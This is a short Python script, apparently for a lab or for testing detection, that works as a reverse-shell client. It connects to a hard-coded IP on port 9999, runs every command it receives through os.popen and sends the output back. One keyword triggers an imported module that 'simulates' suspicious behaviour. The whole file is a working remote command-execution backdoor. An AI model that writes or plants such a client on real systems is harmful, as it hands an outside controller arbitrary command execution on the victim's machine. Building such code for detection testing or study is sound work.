import socket
import os
import suspicious_behavior  # Import the script

def client():
    host = '192.168.100.23'  # <-- Replace with your SERVER (your PC's) IP address
    port = 9999

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    while True:
        data = s.recv(4096).decode()
        if data.lower() == 'exit':
            break
        elif data.lower() == 'runsuspicious':
            suspicious_behavior.run_all()
            s.send(b"[+] Suspicious behavior simulated.")
        else:
            output = os.popen(data).read()
            if not output:
                output = "Command executed."
            s.send(output.encode())

    s.close()

if __name__ == "__main__":
    client()
